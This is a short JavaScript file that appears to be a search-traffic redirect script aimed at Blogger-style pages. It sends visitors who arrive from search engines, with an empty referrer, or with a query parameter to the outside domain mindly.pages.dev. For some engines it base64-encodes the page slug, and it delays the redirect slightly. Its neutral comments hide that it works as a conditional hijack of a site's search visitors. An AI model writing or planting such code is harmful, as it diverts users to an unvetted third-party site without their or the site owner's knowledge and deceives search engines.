// Immediately invoked function to avoid polluting global scope
(function() {
  // Combine search engines into one array for efficiency
  const searchEngines = [
    'google.', 'bing.', 'yahoo.', 'duckduckgo.', 'baidu.',
    'yandex.', 'ecosia.', 'ask.', 'qwant.', 'startpage.'
  ];

  // Helper Functions
  function isFromSearchEngine(referrer) {
    return searchEngines.some(engine => referrer.includes(engine));
  }

  function extractSlug(url) {
    // Try both slug patterns
    const pattern1 = /\/\d{4}\/\d{2}\/(.+)\.html/;
    const pattern2 = /\/([^\/]+)\.html$/;
    
    const match1 = url.match(pattern1);
    if (match1) {
      return decodeURIComponent(match1[1]).replace(/-/g, ' ');
    }
    
    const match2 = url.match(pattern2);
    if (match2) {
      return match2[1].replace(/-/g, ' ');
    }
    
    return null;
  }

  function performRedirect(slug, useBase64 = false) {
    if (useBase64) {
      const encodedSlug = btoa(encodeURIComponent(slug)).replace(/=/g, '');
      window.location.href = `https://mindly.pages.dev/r/${encodedSlug}`;
    } else {
      window.location.href = `https://mindly.pages.dev/${encodeURIComponent(slug)}`;
    }
  }

  function attemptRedirect() {
    const currentUrl = window.location.href;
    const referrer = document.referrer.toLowerCase();
    const slug = extractSlug(currentUrl);
    const params = new URLSearchParams(window.location.search);
    
    if (slug && (
      isFromSearchEngine(referrer) || 
      referrer === '' || 
      params.has('q') || 
      params.has('query')
    )) {
      // Use base64 encoding for specific search engines
      const useBase64 = ['yandex.', 'ecosia.', 'ask.', 'qwant.', 'startpage.']
        .some(engine => referrer.includes(engine));
      
      performRedirect(slug, useBase64);
    }
  }

  // Execute redirect after a short delay to ensure DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => setTimeout(attemptRedirect, 100));
  } else {
    setTimeout(attemptRedirect, 100);
  }
})();
